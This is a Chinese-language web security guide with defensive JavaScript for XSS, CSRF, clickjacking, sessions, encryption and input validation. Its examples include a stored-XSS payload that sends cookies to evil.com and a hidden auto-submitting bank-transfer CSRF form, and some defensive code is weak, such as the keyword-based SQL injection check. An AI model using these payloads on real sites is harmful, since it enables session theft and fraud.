# Web 安全防护

全面的 Web 安全防护指南，涵盖常见的安全威胁、防护策略和最佳实践，帮助开发者构建安全可靠的 Web 应用。

## 🛡️ 安全威胁概览

### 常见安全威胁分类

| 威胁类型     | 描述              | 影响程度 | 防护难度 |
| ------------ | ----------------- | -------- | -------- |
| **XSS**      | 跨站脚本攻击      | 高       | 中等     |
| **CSRF**     | 跨站请求伪造      | 高       | 中等     |
| **SQL 注入** | 恶意 SQL 代码执行 | 极高     | 低       |
| **点击劫持** | 诱导用户点击      | 中等     | 低       |
| **会话劫持** | 会话令牌窃取      | 高       | 中等     |
| **DDoS**     | 拒绝服务攻击      | 高       | 高       |
| **数据泄露** | 敏感信息暴露      | 极高     | 中等     |

## 🚨 XSS 跨站脚本攻击

### XSS 类型与原理

#### 1. 反射型 XSS (Reflected XSS)

```javascript
// 危险的代码示例
function displayUserInput() {
  const userInput = new URLSearchParams(location.search).get("message");
  // ❌ 直接插入用户输入，存在XSS风险
  document.getElementById("output").innerHTML = userInput;
}

// 攻击示例URL
// https://example.com?message=<script>alert('XSS')</script>
```

#### 2. 存储型 XSS (Stored XSS)

```javascript
// 危险的评论系统
function addComment(comment) {
  // ❌ 直接存储和显示用户输入
  const commentHtml = `<div class="comment">${comment}</div>`;
  document.getElementById("comments").innerHTML += commentHtml;
}

// 攻击payload
// <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

#### 3. DOM 型 XSS

```javascript
// 危险的DOM操作
function updateContent() {
  const hash = location.hash.substring(1);
  // ❌ 直接使用URL片段更新DOM
  document.getElementById("content").innerHTML = decodeURIComponent(hash);
}

// 攻击示例URL
// https://example.com#<img src=x onerror=alert('XSS')>
```

### XSS 防护策略

#### 1. 输入验证与过滤

```javascript
// XSS防护工具类
class XSSProtection {
  // HTML实体编码
  static encodeHTML(str) {
    const entityMap = {
      "&": "&amp;",
      "<": "&lt;",
      ">": "&gt;",
      '"': "&quot;",
      "'": "&#x27;",
      "/": "&#x2F;",
    };

    return String(str).replace(/[&<>"'/]/g, (match) => {
      return entityMap[match];
    });
  }

  // 属性值编码
  static encodeAttribute(str) {
    return String(str)
      .replace(/&/g, "&amp;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#x27;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;");
  }

  // JavaScript字符串编码
  static encodeJS(str) {
    return String(str)
      .replace(/\\/g, "\\\\")
      .replace(/"/g, '\\"')
      .replace(/'/g, "\\'")
      .replace(/\n/g, "\\n")
      .replace(/\r/g, "\\r")
      .replace(/\t/g, "\\t")
      .replace(/\f/g, "\\f")
      .replace(/\v/g, "\\v")
      .replace(/\0/g, "\\0");
  }

  // URL编码
  static encodeURL(str) {
    return encodeURIComponent(str);
  }

  // CSS编码
  static encodeCSS(str) {
    return String(str).replace(/[^\w-]/g, (match) => {
      const hex = match.charCodeAt(0).toString(16);
      return "\\" + hex + " ";
    });
  }

  // 白名单HTML标签过滤
  static sanitizeHTML(html, allowedTags = ["b", "i", "em", "strong"]) {
    const div = document.createElement("div");
    div.innerHTML = html;

    // 移除不允许的标签
    const walker = document.createTreeWalker(
      div,
      NodeFilter.SHOW_ELEMENT,
      null,
      false
    );

    const nodesToRemove = [];
    let node;

    while ((node = walker.nextNode())) {
      if (!allowedTags.includes(node.tagName.toLowerCase())) {
        nodesToRemove.push(node);
      }
    }

    nodesToRemove.forEach((node) => {
      // 保留文本内容，移除标签
      const textNode = document.createTextNode(node.textContent);
      node.parentNode.replaceChild(textNode, node);
    });

    return div.innerHTML;
  }
}

// 安全的内容渲染
function safeRender(userInput, context = "html") {
  switch (context) {
    case "html":
      return XSSProtection.encodeHTML(userInput);
    case "attribute":
      return XSSProtection.encodeAttribute(userInput);
    case "javascript":
      return XSSProtection.encodeJS(userInput);
    case "url":
      return XSSProtection.encodeURL(userInput);
    case "css":
      return XSSProtection.encodeCSS(userInput);
    default:
      return XSSProtection.encodeHTML(userInput);
  }
}

// 使用示例
const userInput = '<script>alert("XSS")</script>';
document.getElementById("output").textContent = safeRender(userInput);
// 或使用innerHTML时
document.getElementById("output").innerHTML = safeRender(userInput, "html");
```

#### 2. 内容安全策略 (CSP)

```javascript
// CSP头部设置 (服务端)
const cspHeaders = {
  // 基础CSP策略
  basic: "default-src 'self'",

  // 严格策略
  strict: [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline'",
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "font-src 'self'",
    "connect-src 'self'",
    "frame-src 'none'",
    "object-src 'none'",
    "base-uri 'self'",
  ].join("; "),

  // 生产环境推荐策略
  production: [
    "default-src 'self'",
    "script-src 'self' 'sha256-{hash}'",
    "style-src 'self' 'sha256-{hash}'",
    "img-src 'self' https: data:",
    "font-src 'self' https:",
    "connect-src 'self' https:",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "upgrade-insecure-requests",
  ].join("; "),
};

// CSP违规报告处理
function setupCSPReporting() {
  // 监听CSP违规事件
  document.addEventListener("securitypolicyviolation", (event) => {
    const violation = {
      blockedURI: event.blockedURI,
      violatedDirective: event.violatedDirective,
      originalPolicy: event.originalPolicy,
      documentURI: event.documentURI,
      lineNumber: event.lineNumber,
      columnNumber: event.columnNumber,
      timestamp: Date.now(),
    };

    // 发送违规报告
    fetch("/api/csp-violation", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(violation),
    });

    console.warn("CSP Violation:", violation);
  });
}

// 动态生成CSP nonce
function generateCSPNonce() {
  const array = new Uint8Array(16);
  crypto.getRandomValues(array);
  return btoa(String.fromCharCode.apply(null, array))
    .replace(/\+/g, "-")
    .replace(/\//g, "_")
    .replace(/=/g, "");
}

// 安全的脚本加载
function loadScriptSecurely(src, nonce) {
  const script = document.createElement("script");
  script.src = src;
  script.nonce = nonce;
  script.crossOrigin = "anonymous";
  document.head.appendChild(script);
}
```

## 🔐 CSRF 跨站请求伪造

### CSRF 攻击原理

```html
<!-- 攻击者网站上的恶意表单 -->
<form action="https://bank.com/transfer" method="POST" style="display:none">
  <input name="to" value="attacker-account" />
  <input name="amount" value="10000" />
</form>
<script>
  // 自动提交表单，利用用户在银行网站的登录状态
  document.forms[0].submit();
</script>
```

### CSRF 防护策略

#### 1. CSRF Token 防护

```javascript
// CSRF Token管理器
class CSRFProtection {
  constructor() {
    this.token = this.generateToken();
    this.tokenName = "_csrf_token";
  }

  // 生成CSRF Token
  generateToken() {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return Array.from(array, (byte) => byte.toString(16).padStart(2, "0")).join(
      ""
    );
  }

  // 获取当前Token
  getToken() {
    return this.token;
  }

  // 验证Token
  validateToken(providedToken) {
    return this.token === providedToken;
  }

  // 刷新Token
  refreshToken() {
    this.token = this.generateToken();
    this.updateTokenInForms();
    this.updateTokenInMeta();
  }

  // 在所有表单中添加CSRF Token
  addTokenToForms() {
    const forms = document.querySelectorAll("form");
    forms.forEach((form) => {
      if (!form.querySelector(`input[name="${this.tokenName}"]`)) {
        const tokenInput = document.createElement("input");
        tokenInput.type = "hidden";
        tokenInput.name = this.tokenName;
        tokenInput.value = this.token;
        form.appendChild(tokenInput);
      }
    });
  }

  // 更新表单中的Token
  updateTokenInForms() {
    const tokenInputs = document.querySelectorAll(
      `input[name="${this.tokenName}"]`
    );
    tokenInputs.forEach((input) => {
      input.value = this.token;
    });
  }

  // 在meta标签中设置Token
  updateTokenInMeta() {
    let metaTag = document.querySelector('meta[name="csrf-token"]');
    if (!metaTag) {
      metaTag = document.createElement("meta");
      metaTag.name = "csrf-token";
      document.head.appendChild(metaTag);
    }
    metaTag.content = this.token;
  }

  // AJAX请求拦截器
  setupAjaxInterceptor() {
    const originalFetch = window.fetch;
    const csrfProtection = this;

    window.fetch = function (url, options = {}) {
      // 只对POST、PUT、DELETE请求添加CSRF Token
      if (["POST", "PUT", "DELETE"].includes(options.method?.toUpperCase())) {
        options.headers = options.headers || {};
        options.headers["X-CSRF-Token"] = csrfProtection.getToken();
      }

      return originalFetch.call(this, url, options);
    };

    // 拦截XMLHttpRequest
    const originalOpen = XMLHttpRequest.prototype.open;
    const originalSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function (method, url, ...args) {
      this._method = method;
      return originalOpen.call(this, method, url, ...args);
    };

    XMLHttpRequest.prototype.send = function (data) {
      if (["POST", "PUT", "DELETE"].includes(this._method?.toUpperCase())) {
        this.setRequestHeader("X-CSRF-Token", csrfProtection.getToken());
      }
      return originalSend.call(this, data);
    };
  }
}

// 使用CSRF防护
const csrfProtection = new CSRFProtection();
csrfProtection.addTokenToForms();
csrfProtection.updateTokenInMeta();
csrfProtection.setupAjaxInterceptor();

// 定期刷新Token
setInterval(() => {
  csrfProtection.refreshToken();
}, 30 * 60 * 1000); // 每30分钟刷新一次
```

#### 2. SameSite Cookie 属性

```javascript
// Cookie安全设置
function setSecureCookie(name, value, options = {}) {
  const defaults = {
    secure: location.protocol === "https:",
    httpOnly: false, // 客户端设置时不能使用httpOnly
    sameSite: "Strict", // 防止CSRF攻击
    path: "/",
    maxAge: 86400, // 24小时
  };

  const config = { ...defaults, ...options };

  let cookieString = `${encodeURIComponent(name)}=${encodeURIComponent(value)}`;

  if (config.maxAge) {
    cookieString += `; Max-Age=${config.maxAge}`;
  }

  if (config.path) {
    cookieString += `; Path=${config.path}`;
  }

  if (config.domain) {
    cookieString += `; Domain=${config.domain}`;
  }

  if (config.secure) {
    cookieString += "; Secure";
  }

  if (config.sameSite) {
    cookieString += `; SameSite=${config.sameSite}`;
  }

  document.cookie = cookieString;
}

// 设置防CSRF的Cookie
setSecureCookie("session_token", "abc123", {
  sameSite: "Strict",
  secure: true,
});
```

## 🎭 点击劫持防护

### 点击劫持原理

```html
<!-- 攻击者网站 -->
<style>
  iframe {
    opacity: 0;
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 2;
  }
  .fake-button {
    position: absolute;
    top: 100px;
    left: 100px;
    z-index: 1;
  }
</style>

<div class="fake-button">点击获取奖品！</div>
<iframe src="https://bank.com/transfer"></iframe>
```

### 点击劫持防护

```javascript
// Frame Busting - 防止页面被嵌入iframe
class ClickjackingProtection {
  static init() {
    // 1. JavaScript Frame Busting
    this.frameBusting();

    // 2. 设置X-Frame-Options
    this.setFrameOptions();

    // 3. 使用CSP frame-ancestors
    this.setCSPFrameAncestors();

    // 4. 监控iframe嵌入
    this.monitorFrameEmbedding();
  }

  static frameBusting() {
    // 检查是否被嵌入
    if (window.top !== window.self) {
      // 尝试跳出iframe
      try {
        window.top.location = window.self.location;
      } catch (e) {
        // 如果跳出失败，隐藏页面内容
        document.body.style.display = "none";

        // 显示警告信息
        const warning = document.createElement("div");
        warning.innerHTML = `
          <div style="
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #fff;
            z-index: 99999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
          ">
            <div style="text-align: center;">
              <h2>安全警告</h2>
              <p>检测到页面被非法嵌入，请直接访问：</p>
              <a href="${window.location.href}" target="_top">
                ${window.location.href}
              </a>
            </div>
          </div>
        `;
        document.body.appendChild(warning);
      }
    }
  }

  static setFrameOptions() {
    // 通过meta标签设置（虽然不如HTTP头有效）
    const meta = document.createElement("meta");
    meta.httpEquiv = "X-Frame-Options";
    meta.content = "DENY";
    document.head.appendChild(meta);
  }

  static setCSPFrameAncestors() {
    // 设置CSP frame-ancestors指令
    const meta = document.createElement("meta");
    meta.httpEquiv = "Content-Security-Policy";
    meta.content = "frame-ancestors 'none'";
    document.head.appendChild(meta);
  }

  static monitorFrameEmbedding() {
    // 定期检查是否被嵌入
    setInterval(() => {
      if (window.top !== window.self) {
        console.warn("页面被嵌入iframe中");
        // 可以发送告警到服务器
        this.reportClickjackingAttempt();
      }
    }, 1000);
  }

  static reportClickjackingAttempt() {
    fetch("/api/security/clickjacking-attempt", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        timestamp: Date.now(),
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        currentUrl: window.location.href,
      }),
    });
  }
}

// 页面加载时立即执行
ClickjackingProtection.init();
```

## 🔒 会话安全

### 会话管理最佳实践

```javascript
// 安全会话管理器
class SecureSessionManager {
  constructor(options = {}) {
    this.sessionTimeout = options.timeout || 30 * 60 * 1000; // 30分钟
    this.warningTime = options.warningTime || 5 * 60 * 1000; // 5分钟警告
    this.checkInterval = options.checkInterval || 60 * 1000; // 1分钟检查

    this.lastActivity = Date.now();
    this.warningShown = false;
    this.sessionValid = true;

    this.init();
  }

  init() {
    this.trackActivity();
    this.startSessionCheck();
    this.setupBeforeUnload();
  }

  // 跟踪用户活动
  trackActivity() {
    const events = [
      "mousedown",
      "mousemove",
      "keypress",
      "scroll",
      "touchstart",
    ];

    events.forEach((event) => {
      document.addEventListener(
        event,
        () => {
          this.updateActivity();
        },
        true
      );
    });
  }

  updateActivity() {
    this.lastActivity = Date.now();
    this.warningShown = false;

    // 发送心跳到服务器
    this.sendHeartbeat();
  }

  sendHeartbeat() {
    if (!this.sessionValid) return;

    fetch("/api/session/heartbeat", {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        timestamp: this.lastActivity,
      }),
    }).catch((error) => {
      console.warn("心跳发送失败:", error);
    });
  }

  // 定期检查会话状态
  startSessionCheck() {
    setInterval(() => {
      this.checkSession();
    }, this.checkInterval);
  }

  checkSession() {
    const now = Date.now();
    const timeSinceActivity = now - this.lastActivity;

    // 显示警告
    if (
      timeSinceActivity > this.sessionTimeout - this.warningTime &&
      !this.warningShown
    ) {
      this.showSessionWarning();
      this.warningShown = true;
    }

    // 会话超时
    if (timeSinceActivity > this.sessionTimeout) {
      this.expireSession();
    }
  }

  showSessionWarning() {
    const remainingTime = Math.ceil(
      (this.sessionTimeout - (Date.now() - this.lastActivity)) / 1000
    );

    if (confirm(`您的会话将在 ${remainingTime} 秒后过期。点击确定继续会话。`)) {
      this.updateActivity();
    }
  }

  expireSession() {
    this.sessionValid = false;

    // 清除本地存储
    this.clearLocalData();

    // 通知服务器会话过期
    fetch("/api/session/expire", {
      method: "POST",
      credentials: "include",
    });

    // 重定向到登录页
    alert("会话已过期，请重新登录");
    window.location.href = "/login";
  }

  clearLocalData() {
    // 清除敏感的本地存储数据
    localStorage.removeItem("user_data");
    sessionStorage.clear();

    // 清除特定的cookies
    this.clearSecurityCookies();
  }

  clearSecurityCookies() {
    const cookiesToClear = ["session_token", "auth_token", "user_session"];

    cookiesToClear.forEach((cookieName) => {
      document.cookie = `${cookieName}=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
    });
  }

  setupBeforeUnload() {
    window.addEventListener("beforeunload", () => {
      // 通知服务器页面即将卸载
      navigator.sendBeacon(
        "/api/session/page-unload",
        JSON.stringify({
          timestamp: Date.now(),
          sessionDuration: Date.now() - this.lastActivity,
        })
      );
    });
  }

  // 手动延长会话
  extendSession() {
    return fetch("/api/session/extend", {
      method: "POST",
      credentials: "include",
    }).then((response) => {
      if (response.ok) {
        this.updateActivity();
        return true;
      }
      return false;
    });
  }

  // 安全登出
  logout() {
    this.sessionValid = false;

    // 清除所有本地数据
    this.clearLocalData();

    // 通知服务器登出
    return fetch("/api/auth/logout", {
      method: "POST",
      credentials: "include",
    }).finally(() => {
      window.location.href = "/login";
    });
  }
}

// 初始化会话管理
const sessionManager = new SecureSessionManager({
  timeout: 30 * 60 * 1000, // 30分钟
  warningTime: 5 * 60 * 1000, // 5分钟警告
  checkInterval: 60 * 1000, // 1分钟检查
});

// 绑定登出按钮
document.getElementById("logout-btn")?.addEventListener("click", () => {
  sessionManager.logout();
});
```

## 🔐 数据加密与存储安全

### 客户端加密

```javascript
// 客户端加密工具
class ClientCrypto {
  // 生成密钥
  static async generateKey() {
    return await crypto.subtle.generateKey(
      {
        name: "AES-GCM",
        length: 256,
      },
      true,
      ["encrypt", "decrypt"]
    );
  }

  // 加密数据
  static async encrypt(data, key) {
    const encoder = new TextEncoder();
    const dataBuffer = encoder.encode(JSON.stringify(data));

    const iv = crypto.getRandomValues(new Uint8Array(12));

    const encryptedData = await crypto.subtle.encrypt(
      {
        name: "AES-GCM",
        iv: iv,
      },
      key,
      dataBuffer
    );

    return {
      data: Array.from(new Uint8Array(encryptedData)),
      iv: Array.from(iv),
    };
  }

  // 解密数据
  static async decrypt(encryptedData, key) {
    const dataArray = new Uint8Array(encryptedData.data);
    const ivArray = new Uint8Array(encryptedData.iv);

    const decryptedData = await crypto.subtle.decrypt(
      {
        name: "AES-GCM",
        iv: ivArray,
      },
      key,
      dataArray
    );

    const decoder = new TextDecoder();
    return JSON.parse(decoder.decode(decryptedData));
  }

  // 导出密钥
  static async exportKey(key) {
    return await crypto.subtle.exportKey("raw", key);
  }

  // 导入密钥
  static async importKey(keyData) {
    return await crypto.subtle.importKey(
      "raw",
      keyData,
      { name: "AES-GCM" },
      true,
      ["encrypt", "decrypt"]
    );
  }

  // 哈希计算
  static async hash(data) {
    const encoder = new TextEncoder();
    const dataBuffer = encoder.encode(data);

    const hashBuffer = await crypto.subtle.digest("SHA-256", dataBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));

    return hashArray.map((b) => b.toString(16).padStart(2, "0")).join("");
  }
}

// 安全存储管理器
class SecureStorage {
  constructor() {
    this.keyName = "_secure_storage_key";
    this.init();
  }

  async init() {
    this.key = await this.getOrCreateKey();
  }

  async getOrCreateKey() {
    // 尝试从sessionStorage获取密钥
    const storedKey = sessionStorage.getItem(this.keyName);

    if (storedKey) {
      const keyData = new Uint8Array(JSON.parse(storedKey));
      return await ClientCrypto.importKey(keyData);
    } else {
      // 生成新密钥
      const key = await ClientCrypto.generateKey();
      const keyData = await ClientCrypto.exportKey(key);

      // 存储到sessionStorage（页面刷新后失效）
      sessionStorage.setItem(
        this.keyName,
        JSON.stringify(Array.from(new Uint8Array(keyData)))
      );

      return key;
    }
  }

  // 安全存储数据
  async setItem(key, value) {
    if (!this.key) await this.init();

    const encryptedData = await ClientCrypto.encrypt(value, this.key);
    localStorage.setItem(key, JSON.stringify(encryptedData));
  }

  // 安全读取数据
  async getItem(key) {
    if (!this.key) await this.init();

    const storedData = localStorage.getItem(key);
    if (!storedData) return null;

    try {
      const encryptedData = JSON.parse(storedData);
      return await ClientCrypto.decrypt(encryptedData, this.key);
    } catch (error) {
      console.error("解密失败:", error);
      return null;
    }
  }

  // 删除数据
  removeItem(key) {
    localStorage.removeItem(key);
  }

  // 清除所有加密数据
  clear() {
    // 只清除加密存储的数据
    const keysToRemove = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      try {
        const data = JSON.parse(localStorage.getItem(key));
        if (data && data.data && data.iv) {
          keysToRemove.push(key);
        }
      } catch (e) {
        // 忽略非JSON数据
      }
    }

    keysToRemove.forEach((key) => localStorage.removeItem(key));
    sessionStorage.removeItem(this.keyName);
  }
}

// 使用示例
const secureStorage = new SecureStorage();

// 存储敏感数据
await secureStorage.setItem("user_profile", {
  email: "user@example.com",
  preferences: { theme: "dark" },
});

// 读取数据
const userProfile = await secureStorage.getItem("user_profile");
console.log(userProfile);
```

## 🛡️ 输入验证与清理

### 综合输入验证

```javascript
// 输入验证器
class InputValidator {
  // 邮箱验证
  static validateEmail(email) {
    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailRegex.test(email) && email.length <= 254;
  }

  // 密码强度验证
  static validatePassword(password) {
    const minLength = 8;
    const hasUpperCase = /[A-Z]/.test(password);
    const hasLowerCase = /[a-z]/.test(password);
    const hasNumbers = /\d/.test(password);
    const hasSpecialChar = /[!@#$%^&*(),.?":{}|<>]/.test(password);

    return {
      isValid:
        password.length >= minLength &&
        hasUpperCase &&
        hasLowerCase &&
        hasNumbers &&
        hasSpecialChar,
      score: [hasUpperCase, hasLowerCase, hasNumbers, hasSpecialChar].filter(
        Boolean
      ).length,
      requirements: {
        minLength: password.length >= minLength,
        hasUpperCase,
        hasLowerCase,
        hasNumbers,
        hasSpecialChar,
      },
    };
  }

  // URL验证
  static validateURL(url) {
    try {
      const urlObj = new URL(url);
      return ["http:", "https:"].includes(urlObj.protocol);
    } catch (e) {
      return false;
    }
  }

  // 文件类型验证
  static validateFileType(file, allowedTypes = []) {
    if (!file) return false;

    const fileType = file.type;
    const fileName = file.name;
    const fileExtension = fileName.split(".").pop().toLowerCase();

    // 检查MIME类型
    const mimeTypeValid = allowedTypes.includes(fileType);

    // 检查文件扩展名
    const allowedExtensions = allowedTypes
      .map((type) => {
        const extensionMap = {
          "image/jpeg": "jpg",
          "image/jpg": "jpg",
          "image/png": "png",
          "image/gif": "gif",
          "text/plain": "txt",
          "application/pdf": "pdf",
        };
        return extensionMap[type];
      })
      .filter(Boolean);

    const extensionValid = allowedExtensions.includes(fileExtension);

    return mimeTypeValid && extensionValid;
  }

  // SQL注入检测
  static detectSQLInjection(input) {
    const sqlKeywords = [
      "union",
      "select",
      "insert",
      "update",
      "delete",
      "drop",
      "create",
      "alter",
      "exec",
      "execute",
      "script",
      "iframe",
    ];

    const normalizedInput = input.toLowerCase();

    return sqlKeywords.some((keyword) => normalizedInput.includes(keyword));
  }

  // XSS检测
  static detectXSS(input) {
    const xssPatterns = [
      /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
      /<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi,
      /javascript:/gi,
      /on\w+\s*=/gi,
      /<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/gi,
      /<embed\b[^<]*(?:(?!<\/embed>)<[^<]*)*<\/embed>/gi,
    ];

    return xssPatterns.some((pattern) => pattern.test(input));
  }

  // 综合输入清理
  static sanitizeInput(input, options = {}) {
    if (typeof input !== "string") return "";

    let cleaned = input;

    // 移除HTML标签
    if (options.stripHtml !== false) {
      cleaned = cleaned.replace(/<[^>]*>/g, "");
    }

    // 移除脚本
    if (options.stripScripts !== false) {
      cleaned = cleaned.replace(
        /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
        ""
      );
    }

    // 移除危险属性
    if (options.stripAttributes !== false) {
      cleaned = cleaned.replace(/on\w+\s*=\s*["'][^"']*["']/gi, "");
    }

    // 限制长度
    if (options.maxLength) {
      cleaned = cleaned.substring(0, options.maxLength);
    }

    // 移除多余空白
    if (options.trimWhitespace !== false) {
      cleaned = cleaned.trim().replace(/\s+/g, " ");
    }

    return cleaned;
  }
}

// 表单验证器
class FormValidator {
  constructor(form, rules) {
    this.form = form;
    this.rules = rules;
    this.errors = {};

    this.init();
  }

  init() {
    this.form.addEventListener("submit", (e) => {
      e.preventDefault();
      if (this.validate()) {
        this.onValidSubmit();
      }
    });

    // 实时验证
    Object.keys(this.rules).forEach((fieldName) => {
      const field = this.form.querySelector(`[name="${fieldName}"]`);
      if (field) {
        field.addEventListener("blur", () => {
          this.validateField(fieldName);
        });
      }
    });
  }

  validate() {
    this.errors = {};

    Object.keys(this.rules).forEach((fieldName) => {
      this.validateField(fieldName);
    });

    this.displayErrors();
    return Object.keys(this.errors).length === 0;
  }

  validateField(fieldName) {
    const field = this.form.querySelector(`[name="${fieldName}"]`);
    if (!field) return;

    const value = field.value;
    const rules = this.rules[fieldName];

    // 必填验证
    if (rules.required && !value.trim()) {
      this.errors[fieldName] = "此字段为必填项";
      return;
    }

    // 跳过空值的其他验证
    if (!value.trim() && !rules.required) return;

    // 类型验证
    if (rules.type === "email" && !InputValidator.validateEmail(value)) {
      this.errors[fieldName] = "请输入有效的邮箱地址";
      return;
    }

    if (rules.type === "url" && !InputValidator.validateURL(value)) {
      this.errors[fieldName] = "请输入有效的URL";
      return;
    }

    // 长度验证
    if (rules.minLength && value.length < rules.minLength) {
      this.errors[fieldName] = `最少需要${rules.minLength}个字符`;
      return;
    }

    if (rules.maxLength && value.length > rules.maxLength) {
      this.errors[fieldName] = `最多允许${rules.maxLength}个字符`;
      return;
    }

    // 密码强度验证
    if (rules.type === "password") {
      const validation = InputValidator.validatePassword(value);
      if (!validation.isValid) {
        this.errors[fieldName] =
          "密码强度不够，需要包含大小写字母、数字和特殊字符";
        return;
      }
    }

    // 安全检查
    if (InputValidator.detectXSS(value)) {
      this.errors[fieldName] = "输入包含危险字符";
      return;
    }

    if (InputValidator.detectSQLInjection(value)) {
      this.errors[fieldName] = "输入包含非法字符";
      return;
    }

    // 自定义验证
    if (rules.custom && !rules.custom(value)) {
      this.errors[fieldName] = rules.message || "输入格式不正确";
      return;
    }
  }

  displayErrors() {
    // 清除之前的错误显示
    this.form.querySelectorAll(".error-message").forEach((el) => el.remove());
    this.form
      .querySelectorAll(".error")
      .forEach((el) => el.classList.remove("error"));

    // 显示新错误
    Object.keys(this.errors).forEach((fieldName) => {
      const field = this.form.querySelector(`[name="${fieldName}"]`);
      if (field) {
        field.classList.add("error");

        const errorEl = document.createElement("div");
        errorEl.className = "error-message";
        errorEl.textContent = this.errors[fieldName];
        errorEl.style.color = "red";
        errorEl.style.fontSize = "12px";
        errorEl.style.marginTop = "4px";

        field.parentNode.appendChild(errorEl);
      }
    });
  }

  onValidSubmit() {
    // 清理输入数据
    const formData = new FormData(this.form);
    const cleanedData = {};

    for (let [key, value] of formData.entries()) {
      cleanedData[key] = InputValidator.sanitizeInput(value, {
        maxLength: 1000,
        stripHtml: true,
        stripScripts: true,
      });
    }

    // 提交清理后的数据
    this.submitForm(cleanedData);
  }

  submitForm(data) {
    // 实际的表单提交逻辑
    console.log("提交数据:", data);
  }
}

// 使用示例
const form = document.getElementById("contact-form");
const validator = new FormValidator(form, {
  email: {
    required: true,
    type: "email",
  },
  password: {
    required: true,
    type: "password",
    minLength: 8,
  },
  message: {
    required: true,
    maxLength: 500,
  },
});
```

## 📋 安全检查清单

### 安全审计工具

```javascript
// Web安全审计器
class SecurityAuditor {
  constructor() {
    this.issues = [];
    this.recommendations = [];
  }

  // 运行完整安全审计
  async runFullAudit() {
    this.issues = [];
    this.recommendations = [];

    // 检查各种安全问题
    this.checkHTTPS();
    this.checkCSP();
    this.checkCookieSecurity();
    this.checkXFrameOptions();
    this.checkMixedContent();
    this.checkFormSecurity();
    this.checkExternalResources();

    return this.generateReport();
  }

  // 检查HTTPS
  checkHTTPS() {
    if (location.protocol !== "https:") {
      this.addIssue("high", "HTTPS", "网站未使用HTTPS加密");
      this.addRecommendation("启用HTTPS加密传输");
    }
  }

  // 检查CSP
  checkCSP() {
    const cspMeta = document.querySelector(
      'meta[http-equiv="Content-Security-Policy"]'
    );
    if (!cspMeta) {
      this.addIssue("medium", "CSP", "未设置内容安全策略");
      this.addRecommendation("配置适当的CSP策略防御XSS攻击");
    }
  }

  // 检查Cookie安全性
  checkCookieSecurity() {
    const cookies = document.cookie.split(";");
    let hasInsecureCookies = false;

    cookies.forEach((cookie) => {
      if (
        cookie.trim() &&
        !cookie.includes("Secure") &&
        location.protocol === "https:"
      ) {
        hasInsecureCookies = true;
      }
    });

    if (hasInsecureCookies) {
      this.addIssue("medium", "Cookie安全", "存在不安全的Cookie设置");
      this.addRecommendation("为所有Cookie添加Secure和SameSite属性");
    }
  }

  // 检查X-Frame-Options
  checkXFrameOptions() {
    // 检查是否可能被嵌入iframe
    if (window.self === window.top) {
      // 尝试检测iframe保护
      const xFrameMeta = document.querySelector(
        'meta[http-equiv="X-Frame-Options"]'
      );
      if (!xFrameMeta) {
        this.addIssue("medium", "点击劫持", "缺少X-Frame-Options防护");
        this.addRecommendation("设置X-Frame-Options或CSP frame-ancestors");
      }
    }
  }

  // 检查混合内容
  checkMixedContent() {
    if (location.protocol === "https:") {
      const insecureResources = [];

      // 检查图片
      document.querySelectorAll('img[src^="http:"]').forEach((img) => {
        insecureResources.push(`图片: ${img.src}`);
      });

      // 检查脚本
      document.querySelectorAll('script[src^="http:"]').forEach((script) => {
        insecureResources.push(`脚本: ${script.src}`);
      });

      // 检查样式表
      document.querySelectorAll('link[href^="http:"]').forEach((link) => {
        insecureResources.push(`样式: ${link.href}`);
      });

      if (insecureResources.length > 0) {
        this.addIssue(
          "high",
          "混合内容",
          `发现${insecureResources.length}个不安全的资源`
        );
        this.addRecommendation("将所有资源更改为HTTPS");
      }
    }
  }

  // 检查表单安全
  checkFormSecurity() {
    const forms = document.querySelectorAll("form");

    forms.forEach((form, index) => {
      // 检查CSRF保护
      const csrfToken = form.querySelector(
        'input[name*="csrf"], input[name*="token"]'
      );
      if (!csrfToken && form.method.toLowerCase() === "post") {
        this.addIssue("high", "CSRF", `表单${index + 1}缺少CSRF保护`);
        this.addRecommendation("为所有POST表单添加CSRF令牌");
      }

      // 检查密码字段
      const passwordFields = form.querySelectorAll('input[type="password"]');
      passwordFields.forEach((field) => {
        if (form.action.startsWith("http:")) {
          this.addIssue("high", "密码安全", "密码表单使用不安全的HTTP传输");
          this.addRecommendation("密码表单必须使用HTTPS");
        }
      });
    });
  }

  // 检查外部资源
  checkExternalResources() {
    const externalResources = [];

    // 检查外部脚本
    document.querySelectorAll("script[src]").forEach((script) => {
      try {
        const url = new URL(script.src);
        if (url.hostname !== location.hostname) {
          externalResources.push(script.src);
        }
      } catch (e) {
        // 忽略相对URL
      }
    });

    if (externalResources.length > 0) {
      this.addIssue(
        "medium",
        "外部资源",
        `加载了${externalResources.length}个外部资源`
      );
      this.addRecommendation("审查外部资源的安全性，考虑使用子资源完整性(SRI)");
    }
  }

  addIssue(level, category, description) {
    this.issues.push({ level, category, description });
  }

  addRecommendation(text) {
    this.recommendations.push(text);
  }

